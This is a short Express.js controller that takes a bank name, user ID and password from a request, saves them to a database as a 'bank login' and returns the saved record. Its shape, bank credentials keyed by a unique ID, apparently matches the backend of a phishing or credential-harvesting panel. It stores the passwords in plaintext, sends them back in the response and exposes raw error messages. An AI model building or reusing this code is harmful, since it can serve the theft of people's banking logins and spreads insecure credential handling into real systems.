import BankLogin from "../models/bankLoginModel.js";

export const saveBankLogin = async (req, res) => {
    try {
        const { uniqueid, bankName, userId, password } = req.body;

        if (!uniqueid) {
            return res.json({ success: false, message: "Unique ID missing" });
        }

        const entry = new BankLogin({
            uniqueid,
            bankName,
            userId,
            password
        });

        await entry.save();

        return res.json({
            success: true,
            message: "Bank login saved successfully",
            data: entry
        });

    } catch (e) {
        return res.json({
            success: false,
            message: "Server error",
            error: e.message
        });
    }
};
